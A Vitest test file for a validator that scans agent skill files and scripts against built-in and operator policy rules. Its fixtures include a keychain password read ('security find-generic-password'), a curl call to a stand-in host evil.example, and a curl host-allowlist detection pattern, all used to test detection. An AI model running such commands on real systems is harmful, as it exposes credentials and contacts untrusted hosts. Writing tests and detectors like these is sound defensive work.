import { describe, it, expect } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';

import { validateSkillFile, validateSkillDir, parseOperatorPolicy } from '../../../src/main/quality';

type Rules = ReturnType<typeof parseOperatorPolicy>['rules'];

const POLICY = JSON.stringify({ rules: [
  { id: 'no_internal_bucket', level: 'EXTREME', pattern: 's3://acme-internal',
    message: 'Internal buckets are off limits for skills.' },
  { id: 'host_allowlist', level: 'MEDIUM', pattern: 'curl\\b[^\\n]*https?://(?!api\\.acme\\.example)',
    appliesTo: ['script'] },
] });

const md = (b: string) => ['---', 'name: internal-report', 'description: Build the weekly report', '---', b].join('\n');

function report(content: string, operatorRules?: Rules) {
  const r = validateSkillFile({ relpath: 'SKILL.md', content, operatorRules });
  return { ok: r.ok, violations: r.violations, validator_version: r.validator_version };
}
describe('quality › operator policy rules', () => {
  it('parses a valid rule file and applies the documented defaults', () => {
    const { rules, errors } = parseOperatorPolicy(POLICY);
    expect(rules.map((r) => r.id)).toEqual(['no_internal_bucket', 'host_allowlist']);
    expect(rules[0].appliesTo).toEqual(['skill_md', 'script', 'agent_json']);
    expect(rules[1].appliesTo).toEqual(['script']);
  });

  it('leaves the report byte-identical when no operator rules are configured', () => {
    const content = md('```bash\naws s3 cp s3://acme-internal/x .\n```\n');
    expect(report(content).violations).toEqual([]); // nothing on the built-in floor fires here
    for (const rules of [undefined, []]) expect(report(content, rules)).toEqual(report(content));
  });

  it('adds an operator finding tagged source=operator-policy', () => {
    const { rules } = parseOperatorPolicy(POLICY);
    const r = validateSkillFile({
      relpath: 'SKILL.md',
      content: md('```bash\naws s3 cp s3://acme-internal/x .\n```\n'),
      operatorRules: rules,
    });
    const hit = r.violations.find((v) => v.rule === 'no_internal_bucket');
    expect(hit).toMatchObject({ level: 'EXTREME', source: 'operator-policy' });
    expect(r.ok).toBe(false);
  });

  it('cannot suppress, downgrade, or rewrite a built-in finding', () => {
    const { rules } = parseOperatorPolicy(JSON.stringify({ rules: [
      { id: 'downgrade_attempt', level: 'LOW', pattern: 'security\\s+find-generic-password' }] }));
    const content = md('```bash\nsecurity find-generic-password -s x -w\n```\n');
    const before = report(content);
    const after = report(content, rules);
    expect(before.violations.find((v) => v.rule === 'no_credential_path_read')?.level).toBe('EXTREME');
    // Operator rules only ever add: every built-in finding survives unchanged.
    for (const v of before.violations) {
      expect(after.violations.find((x) => x.rule === v.rule && x.field === v.field)).toEqual(v);
    }
    expect(after.ok).toBe(false);
  });

  it('rejects malformed rules and ids that would shadow the floor', () => {
    expect(parseOperatorPolicy('{not json').errors[0]).toMatch(/not valid JSON/);
    expect(parseOperatorPolicy('{}').errors[0]).toMatch(/"rules" array/);
    const cases: Array<[unknown, RegExp]> = [
      [{ id: 'no_credential_path_read', level: 'LOW', pattern: 'x' }, /collides with a built-in rule/],
      [{ id: 'other_only', level: 'LOW', pattern: 'x', appliesTo: ['other'] }, /"appliesTo" must be a non-empty array/],
    ];
    for (const [rule, expected] of cases) {
      const parsed = parseOperatorPolicy(JSON.stringify({ rules: [rule] }));
      expect(parsed.rules).toEqual([]);
      expect(parsed.errors[0]).toMatch(expected);
    }
  });

  it('honours skill_md rules on executable blocks and keeps script rules scoped to scripts', () => {
    const content = md('```bash\necho acme-secret\n```\n');
    const onlyMd = parseOperatorPolicy(JSON.stringify({ rules: [
      { id: 'skill_md_only', level: 'MEDIUM', pattern: 'acme-secret', appliesTo: ['skill_md'] }] })).rules;
    const onlyScript = parseOperatorPolicy(JSON.stringify({ rules: [
      { id: 'script_only', level: 'MEDIUM', pattern: 'acme-secret', appliesTo: ['script'] }] })).rules;

    expect(validateSkillFile({ relpath: 'SKILL.md', content, operatorRules: onlyMd }).violations)
      .toEqual(expect.arrayContaining([expect.objectContaining({ rule: 'skill_md_only', source: 'operator-policy' })]));
    expect(validateSkillFile({ relpath: 'SKILL.md', content, operatorRules: onlyScript }).violations)
      .not.toEqual(expect.arrayContaining([expect.objectContaining({ rule: 'script_only' })]));
  });

  it('applies skill_meta rules to file- and directory-level sidecar validation', () => {
    const content = JSON.stringify({ category: 'acme-secret' });
    const { rules } = parseOperatorPolicy(JSON.stringify({ rules: [
      { id: 'meta_secret', level: 'MEDIUM', pattern: 'acme-secret', appliesTo: ['skill_meta'] }] }));

    expect(validateSkillFile({ relpath: '_meta.json', content, operatorRules: rules }).violations)
      .toEqual(expect.arrayContaining([expect.objectContaining({ rule: 'meta_secret', field: '_meta.json:1' })]));

    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'quality-op-meta-'));
    fs.writeFileSync(path.join(dir, 'SKILL.md'), md('No executable content.'));
    fs.writeFileSync(path.join(dir, '_meta.json'), content);
    expect(validateSkillDir(dir, { operatorRules: rules }).violations)
      .toEqual(expect.arrayContaining([expect.objectContaining({ rule: 'meta_secret', field: '_meta.json:1' })]));
  });

  it('scans on-disk scripts, honours appliesTo, and never flips the floor verdict', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'quality-op-'));
    fs.writeFileSync(path.join(dir, 'SKILL.md'), md('See scripts/report.sh.'));
    fs.mkdirSync(path.join(dir, 'scripts'));
    fs.writeFileSync(path.join(dir, 'scripts', 'report.sh'), 'curl -fsS https://evil.example/x\n');

    const base = validateSkillDir(dir);
    const { rules } = parseOperatorPolicy(POLICY);
    const withPolicy = validateSkillDir(dir, { operatorRules: rules });

    expect(withPolicy.violations.find((v) => v.rule === 'host_allowlist')).toMatchObject({
      level: 'MEDIUM', source: 'operator-policy', field: 'scripts/report.sh:1',
    });
    // MEDIUM is advisory: it must not flip the built-in verdict.
    // appliesTo=['script'] keeps the rule out of a bare SKILL.md body.
    const onlyMd = validateSkillFile({
      relpath: 'SKILL.md', content: md('curl https://evil.example'), operatorRules: rules,
    });
    expect(onlyMd.violations).toEqual([]);
  });
});
